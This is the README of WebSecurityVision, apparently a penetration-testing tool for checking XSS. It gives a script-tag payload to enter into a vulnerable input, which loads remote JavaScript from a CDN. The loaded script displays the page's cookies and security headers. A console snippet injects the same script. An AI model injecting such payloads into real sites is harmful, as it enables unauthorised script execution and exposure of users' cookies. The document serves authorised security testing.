# WebSecurityVision

WebSecurityVision is a tool for checking XSS vulnerability in the Pentest process, by calling it on the page, if the site has XSS vulnerability and the security headers are not set correctly, the browser information, including cookies and headers related to the cyber security space shows.

<p align="center">
    ![Screenshot](https://github.com/TheWation/WebSecurityVision/blob/master/github/screenshot.png?raw=true)
</p>

## Usage

To use, enter the following code through the vulnerable section or enter the page through the Developer Console section.

Vulnerable Input:

```javascript
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js></SCRIPT>
```

Inspect Element:

```javascript
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js';
document.head.appendChild(script);
```

## License

`WebSecurityVision` is made with ♥  by [Wation](https://github.com/TheWation) and it's released under the MIT license.